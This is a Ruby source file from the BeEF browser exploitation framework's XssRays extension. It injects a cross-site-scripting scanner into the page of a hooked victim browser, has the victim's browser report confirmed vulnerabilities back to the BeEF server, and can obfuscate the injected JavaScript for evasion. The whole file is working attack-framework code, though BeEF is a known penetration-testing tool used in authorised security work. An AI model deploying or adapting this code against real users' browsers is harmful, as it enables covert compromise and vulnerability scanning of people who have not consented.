#
# Copyright (c) 2006-2025 Wade Alcorn - wade@bindshell.net
# Browser Exploitation Framework (BeEF) - https://beefproject.com
# See the file 'doc/COPYING' for copying permission
#
module BeEF
  module Extension
    module Xssrays
      module API
        class Scan
          include BeEF::Core::Handlers::Modules::BeEFJS

          #
          # Add the xssrays main JS file to the victim DOM if there is a not-yet-started scan entry in the db.
          #
          def start_scan(hb, body)
            @body = body
            config = BeEF::Core::Configuration.instance
            hb = BeEF::Core::Models::HookedBrowser.find(hb.id)
            # TODO: we should get the xssrays_scan table with more accuracy, if for some reasons we requested
            # TODO: 2 scans on the same hooked browsers, "first" could not get the right result we want
            xs = BeEF::Core::Models::Xssraysscan.where(hooked_browser_id: hb.id, is_started: false).first

            # stop here if there are no XssRays scans to be started
            return if xs.nil? || xs.is_started == true

            # set the scan as started
            xs.update(is_started: true)

            # build the beefjs xssrays component

            # the URI of the XssRays handler where rays should come back if the vulnerability is verified
            beefurl = BeEF::Core::Server.instance.url
            cross_origin = xs.cross_origin
            timeout = xs.clean_timeout

            ws = BeEF::Core::Websocket::Websocket.instance

            # TODO: antisnatchor: prevent sending "content" multiple times.
            #                    Better leaving it after the first run, and don't send it again.
            # todo antisnatchor: remove this gsub crap adding some hook packing.

            # If we use WebSockets, just reply wih the component contents
            if config.get('beef.http.websocket.enable') && ws.getsocket(hb.session)
              content = File.read(find_beefjs_component_path('beef.net.xssrays')).gsub('//
              //   Copyright (c) 2006-2025Wade Alcorn - wade@bindshell.net
              //   Browser Exploitation Framework (BeEF) - https://beefproject.com
              //   See the file \'doc/COPYING\' for copying permission
              //', '')
              add_to_body xs.id, hb.session, beefurl, cross_origin, timeout

              if config.get('beef.extension.evasion.enable')
                evasion = BeEF::Extension::Evasion::Evasion.instance
                ws.send(evasion.obfuscate(content) + @body, hb.session)
              else
                ws.send(content + @body, hb.session)
              end
            # If we use XHR-polling, add the component to the main hook file
            else
              build_missing_beefjs_components 'beef.net.xssrays'
              add_to_body xs.id, hb.session, beefurl, cross_origin, timeout
            end

            print_debug("[XSSRAYS] Adding XssRays to the DOM. Scan id [#{xs.id}], started at [#{xs.scan_start}], cross origin [#{cross_origin}], clean timeout [#{timeout}].")
          end

          def add_to_body(id, session, beefurl, cross_origin, timeout)
            config = BeEF::Core::Configuration.instance

            req = %{
              beef.execute(function() {
                beef.net.xssrays.startScan('#{id}', '#{session}', '#{beefurl}', #{cross_origin}, #{timeout});
              });
            }

            if config.get('beef.extension.evasion.enable')
              evasion = BeEF::Extension::Evasion::Evasion.instance
              @body << evasion.obfuscate(req)
            else
              @body << req
            end
          end
        end
      end
    end
  end
end
